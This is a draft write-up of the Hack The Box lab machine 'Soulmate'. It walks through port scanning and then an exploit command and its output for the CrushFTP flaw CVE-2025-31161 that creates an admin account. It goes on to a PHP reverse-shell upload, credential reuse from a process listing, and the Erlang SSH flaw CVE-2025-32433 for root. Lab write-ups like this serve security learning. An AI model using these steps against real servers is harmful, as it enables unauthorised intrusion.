---
slug: /write-up/htb/machines/easy/sau
pagination_next: null
pagination_prev: null
draft: true
---
# Soulmate

## Enumeration

```bash
└─$ nmap 10.10.11.86              
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-10 18:24 CEST
Stats: 0:00:14 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 32.55% done; ETC: 18:25 (0:00:29 remaining)
Nmap scan report for 10.10.11.86
Host is up (0.45s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 21.46 seconds
```

It has a webserver on port 80, let's enumerate it more:

```bash
└─$ whatweb http://soulmate.htb 
http://soulmate.htb [200 OK] Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[hello@soulmate.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.86], Script, Title[Soulmate - Find Your Perfect Match], nginx[1.18.0]
```

Normal web fuzzing does not reveal anything interesting, just what it can be reached navigating through the website.

The inputs does not seem to be vulnerable to SQL injections.

With virtual host fuzzing, the virtual host `ftp.soulmate.htb` is revealed. Which shows a `CrushFTP web interface`. More info can be found [in this article](https://www.crushftp.com/crush10wiki/Wiki.jsp?page=User%20Manager).

We can determine the actual version running of CrushFTP with: `http://ftp.soulmate.htb/WebInterface/new-ui/version.js` which display:

```js
export default {
  version: "11.W.657-2025_03_08_07_52",
};
```

## Foothold

This means the server version was upgraded in March 2025. Searching for vulnerabilities, there two good possible candidates:

- CVE-2025-54309
- CVE-2025-31161

The second one allowed me to create an admin user using this [poc](https://github.com/Immersive-Labs-Sec/CVE-2025-31161):

```bash
└─$ python cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --new_user mate --password 1234
[+] Preparing Payloads
  [-] Warming up the target
  [-] Target is up and running
[+] Sending Account Create Request
  [!] User created successfully
[+] Exploit Complete you can now login with
   [*] Username: mate
   [*] Password: 1234.
```

Once we have the user created, we can mount the vfs entering the `User management` console and set the upload permissions. In `/app/webProd` the website we explored before is stored. We can determine that by uploading a simple script with `phpinfo` to see if we manage to execute it.

Once determine that this folder is the web we're seeing, we can upload a PHP reverse shell and we'll have a shell with `www-data` user.

Now, we need to do lateral movement.

## Lateral movement

Checking what is running with `ps` we see an Erlang script that leaks `ben` credentials:

```bash
root        1037  0.0  1.6 2252024 66816 ?       Ssl  14:25   0:01 /usr/local/lib/erlang_login/start.escript -B -- -root /usr/local/lib/erlang -bindir /usr/local/lib/erlang/erts-15.2.5/bin -progname erl -- -home /root -- -noshell -boot no_dot_erlang -sname ssh_runner -run escript start -- -- -kernel inet_dist_use_interface {127,0,0,1} -- -extra /usr/local/lib/erlang_login/start.escript
```

```text
        {user_passwords, [{"ben", "HouseXXX"}]},
```

## Privilege escalation

Theoretically, the vulnerability in CrushFTP should lead to RCE according to [this article](https://orionx.foregenix.com/blog/cve-2025-54309-rce-crushftp). Since CrushFTP is running with root, one can develop a plugin that executes system commands and deploy it in CrushFTP. However, I couldn't make it work.

For privilege escalation, we know there's an Erlang SSH thing going on in 2222. Searching for CVE, I have found this [CVE](https://threatprotect.qualys.com/2025/04/21/erlang-otp-ssh-server-remote-code-execution-vulnerability-cve-2025-32433/).

Searching for an exploit in github, I found an script that first confirms the vulnerability is there, and later I modified to open a reverse shell and get root access.
